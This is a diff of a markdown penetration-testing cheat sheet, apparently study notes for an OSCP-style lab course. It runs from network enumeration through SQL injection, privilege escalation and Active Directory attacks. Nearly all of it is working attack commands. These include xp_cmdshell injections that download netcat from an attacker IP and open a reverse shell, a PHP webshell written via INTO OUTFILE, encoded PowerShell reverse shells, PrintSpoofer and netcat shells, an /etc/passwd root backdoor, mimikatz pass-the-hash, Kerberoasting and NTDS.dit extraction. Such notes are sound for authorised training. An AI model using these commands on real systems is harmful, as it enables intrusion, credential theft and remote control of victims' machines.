@@ -101,7 +101,9 @@ Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers
 <!-- TOC --><a name="active"></a>
 ## Active
 `kali@kali:~$ host www.megacorpone.com`
+
 `kali@kali:~$ host -t mx megacorpone.com`
+
 `kali@kali:~$ cat list.txt`
 
 	www
@@ -112,24 +114,39 @@ Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers
 	router
 
 `kali@kali:~$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done`
+
 `kali@kali:~$ nc -nvv -w 1 -z 192.168.50.152 3388-3390`
+
 `kali@kali:~$ nc -nv -u -z -w 1 192.168.50.149 120-123`
+
 `kali@kali:~$ sudo nmap -sS 192.168.50.149`
+
 `kali@kali:~$ nmap -sT 192.168.50.149`
+
 `kali@kali:~$ sudo nmap -sU 192.168.50.149`
+
 `kali@kali:~$ sudo nmap -sU -sS 192.168.50.149`
+
 `kali@kali:~$ nmap -sn 192.168.50.1-253`
+
 `kali@kali:~$ nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt`
+
 `kali@kali:~$ grep Up ping-sweep.txt | cut -d " " -f 2`
+
 `kali@kali:~$ nmap -p 80 192.168.50.1-253 -oG web-sweep.txt`
+
 `kali@kali:~$ grep open web-sweep.txt | cut -d" " -f2`
+
 `kali@kali:~$ nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`
 
 <!-- TOC --><a name="smb-enumeration"></a>
 ### SMB Enumeration
 `kali@kali:~$ sudo nbtscan -r 192.168.50.0/24`
+
 `kali@kali:~$ ls -1 /usr/share/nmap/scripts/smb*`
+
 `kali@kali:~$ nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152`
+
 `C:\> net view \\dc01 /all`
 
 <!-- TOC --><a name="smtp"></a>
@@ -141,11 +158,17 @@ Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers
 <!-- TOC --><a name="snmp"></a>
 ### SNMP
 `kali@kali:~$ echo public > community`
+
 `kali@kali:~$ echo private >> community`
+
 `kali@kali:~$ echo manager >> community`
+
 `kali@kali:~$ for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips`
+
 `kali@kali:~$ onesixtyone -c community -i ips`
+
 `kali@kali:~$ snmpwalk -v1 -c public 192.168.219.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull`
+
 `kali@kali:~$ snmpwalk -v1 -c public 192.168.219.156 .1 > snmp.txt`
 
 <!-- TOC --><a name="sql-injection-attacks"></a>
@@ -153,37 +176,53 @@ Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers
 <!-- TOC --><a name="identifiying-sqli-via-error-based-payloads"></a>
 ## Identifiying SQLi via error-based payloads
 `offsec' OR 1=1 -- //`
+
 `' or 1=1 in (select @@version) -- //`
+
 `' OR 1=1 in (SELECT * FROM users) -- //`
+
 `' or 1=1 in (SELECT password FROM users) -- //`
+
 `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
 
 <!-- TOC --><a name="union-based-payloads"></a>
 ## UNION-based Payloads
 `' ORDER BY 1-- //`
+
 `%' UNION SELECT database(), user(), @@version, null, null -- //`
+
 `' UNION SELECT null, null, database(), user(), @@version  -- //`
+
 `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
 
 <!-- TOC --><a name="blind-sql-injections"></a>
 ## Blind SQL Injections
 `http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`
+
 `http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
 
 <!-- TOC --><a name="manual-code-execution"></a>
 ## Manual Code Execution
 `'; EXECUTE sp_configure 'show advanced options', 1; --`
+
 `'; RECONFIGURE; --`
+
 `'; EXECUTE sp_configure 'xp_cmdshell', 1; --`
+
 `'; RECONFIGURE; --`
+
 `'; EXECUTE xp_cmdshell "powershell.exe wget http://192.168.45.181:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe";-- ';`
+
 `'; EXECUTE xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.181 4444";-- ';`
+
 `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
 
 <!-- TOC --><a name="automating-the-attack"></a>
 ## Automating the attack
 `kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
+
 `kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`
+
 `kali@kali:~$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`
 
 
@@ -196,14 +235,19 @@ Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers
 <!-- TOC --><a name="password-manager"></a>
 ## Password Manager
 `PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+
 `kali@kali:~$ keepass2john Database.kdbx > keepass.hash`
+
 `kali@kali:~$ hashcat --help | grep -i "KeePass"`
+
 `kali@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`
 
 <!-- TOC --><a name="ssh-private-key-passphrase"></a>
 ## SSH Private Key Passphrase
 `kali@kali:~$ chmod 600 id_rsa`
+
 `kali@kali:~$ ssh -i id_rsa -p 2222 dave@192.168.50.201`
+
 `kali@kali:~$ ssh2john id_rsa > ssh.hash`
 
 <!-- TOC --><a name="cracking-ntlm"></a>
@@ -230,11 +274,13 @@ Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers
 ## Cracking Net-NTLMv2
 `kali@kali:~$ sudo responder -I tap0 
 C:\> dir \\IP_Kali\test`
+
 `kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`
 
 <!-- TOC --><a name="relaying-net-ntlmv2"></a>
 ## Relaying Net-NTLMv2
 `kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t IP_Target -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
+
 `C:\>dir \\IP_Kali\test`
 
 > when finding backup SAM and SYSTEM files in windows.old/Windows/system32
@@ -248,29 +294,45 @@ C:\> dir \\IP_Kali\test`
 <!-- TOC --><a name="situational-awareness"></a>
 ## Situational Awareness
 `C:\> whoami /groups`
+
 `PS C:\> Get-LocalUser`
+
 `PS C:\> Get-LocalGroup`
+
 `PS C:\> Get-LocalGroupMember Administrators`
+
 `C:\> systeminfo`
+
 `C:\> ipconfig /all`
+
 `C:\> route print`
+
 `C:\> netstat -ano`
 
 <!-- TOC --><a name="hidden-in-plain-view"></a>
 ## Hidden in Plain View
 `PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+
 `PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+
 `PS C:\> Get-Process`
+
 `PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+
 `PS C:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+
 `PS C:\> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
+
 `C:\> net user steve`
+
 `C:\> runas /user:backupadmin cmd`
 
 <!-- TOC --><a name="information-goldmine-powershell"></a>
 ## Information Goldmine Powershell
 `PS C:\> Get-History`
+
 `PS C:\> (Get-PSReadlineOption).HistorySavePath`
+
 `kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
 
 <!-- TOC --><a name="automated-enumeration"></a>
@@ -281,6 +343,7 @@ C:\> dir \\IP_Kali\test`
 <!-- TOC --><a name="service-binary-hijacking"></a>
 ## Service Binary Hijacking
 `PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+
 `C:\> icacls "C:\xampp\apache\bin\httpd.exe"`
 
 	#include <stdlib.h>
@@ -296,18 +359,27 @@ C:\> dir \\IP_Kali\test`
 	}
 
 `kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+
 `C:\> sc.exe stop mysql`
+
 `C:\> net stop mysql`
+
 `PS C:\> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
+
 `PS C:\> whoami /priv`
+
 `PS C:\> . .\PowerUp.ps1`
+
 `PS C:\> Get-ModifiableServiceFile`
 
 <!-- TOC --><a name="service-dll-hijacking"></a>
 ## Service DLL Hijacking
 `PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+
 `C:\> icacls .\Documents\BetaServ.exe`
+
 `PS C:\> Restart-Service BetaService`
+
 `PS C:\> $env:path`
 
 	#include <stdlib.h>
@@ -341,8 +413,11 @@ C:\> dir \\IP_Kali\test`
 ## Unquoted Service Paths
 
 `PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
+
 `PS C:\> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
+
 `PS C:\> . .\PowerUp.ps1`
+
 `PS C:\> Get-UnquotedService`
 
 <!-- TOC --><a name="scheduled-tasks"></a>
@@ -362,6 +437,7 @@ C:\> dir \\IP_Kali\test`
 
 
 `PS C:\> .\PrintSpoofer64.exe -i -c powershell.exe`
+
 `PS C:\> PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"`
 
 > RottenPotato, SweetPotato or JuicyPotato
@@ -452,6 +528,7 @@ C:\> dir \\IP_Kali\test`
 `$ openssl passwd w00t`
 
 `$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`
+
 `$ su root2`
 
 <!-- TOC --><a name="easy-root-shell"></a>
@@ -561,6 +638,7 @@ C:\> dir \\IP_Kali\test`
 > On owned machine. OpenSSH version must be > 7.6
 
 `C:\> ssh -N -R 1080 kali@192.168.49.100`
+
 `kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres`
  > to remote target
 
@@ -644,41 +722,61 @@ dnscat2> windows`
 ## Manual Enumeration - Expanding our Repertoire
 
 `C:\> net user /domain`
+
 `C:\> net user jeffadmin /domain`
+
 `C:\> net group /domain`
+
 `C:\> net group "Sales Department" /domain`
 
 `PS C:\> Import-Module .\PowerView.ps1`
+
 `PS C:\> Get-NetDomain`
+
 `PS C:\> Get-NetUser`
 `PS C:\> Get-NetUser | select cn`
+
 `PS C:\> Get-NetUser | select cn,pwdlastset,lastlogon`
+
 `PS C:\> Get-NetGroup "Sales Department" | select member`
+
 `PS C:\> Get-NetComputer`
+
 `PS C:\> Get-NetComputer | select operatingsystem,dnshostname`
+
 `PS C:\> Find-LocalAdminAccess`
+
 `PS C:\> Get-NetSession -ComputerName files04 -Verbose`
+
 `PS C:\> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`
+
 `PS C:\> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion`
 
 `PS C:\> .\PsLoggedon.exe \\files04`
 > Check logged on users on machine through remote registry (if enabled)
 
 `C:\> setspn -L iis_service`
+
 `PS C:\> Get-NetUser -SPN | select samaccountname,serviceprincipalname`
+
 `PS C:\> Get-ObjectAcl -Identity stephanie
 Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
+
 `PS C:\> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
 "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName`
 
 `C:\> net group "Management Department" stephanie /add /domain`
+
 `PS C:\> Get-NetGroup "Management Department" | select member`
+
 `PS C:\> Find-DomainShare`
+
 `kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`
 
 <!-- TOC --><a name="active-directory-automated-enumeration"></a>
 ## Active Directory - Automated Enumeration
 `PS C:\> Import-Module .\Sharphound.ps1`
+
 `PS C:\> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Administrator\Documents\ -OutputPrefix "oscp audit"`
 
 `kali@kali:~$ sudo neo4j start`
@@ -687,6 +785,7 @@ Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
 > Some useful queries
 
 `MATCH (m:Computer) RETURN m`
+
 `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`
 
 <!-- TOC --><a name="attacking-active-directory-authentication"></a>
@@ -708,7 +807,9 @@ Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
 ## Kerberoasting
 
 `PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
+
 `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
 `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
 
 <!-- TOC --><a name="silver-tickets"></a>
@@ -731,6 +832,7 @@ Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
 	mimikatz # exit
 
 `PS C:\Tools> klist`
+
 `PS C:\Tools> iwr -UseDefaultCredentials http://web04`
 
 <!-- TOC --><a name="domain-controller-synchronization"></a>
@@ -766,6 +868,7 @@ Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
 
 
 `C:\> winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`
+
 `C:\> winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
 HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
 
@@ -802,8 +905,11 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
 	mimikatz #sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 
 `PS C:\Windows\system32> klist`
+
 `C:\> net use \\files04`
+
 `C:\> klist`
+
 `PS C:\> .\PsExec.exe \\files04 cmd`
 
 <!-- TOC --><a name="pass-the-ticket"></a>
@@ -874,15 +980,18 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
 	mimikatz # misc::cmd
 
 `C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe`
-`C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe
-`
+
+`C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe`
 <!-- TOC --><a name="shadow-copies"></a>
 ## Shadow Copies
 > from DC
 
 `C:\Tools>vshadow.exe -nw -p  C:`
+
 `C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
+
 `C:\> reg.exe save hklm\system c:\system.bak`
+
 `kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
 
 <!-- TOC --><a name="miscelanea"></a>
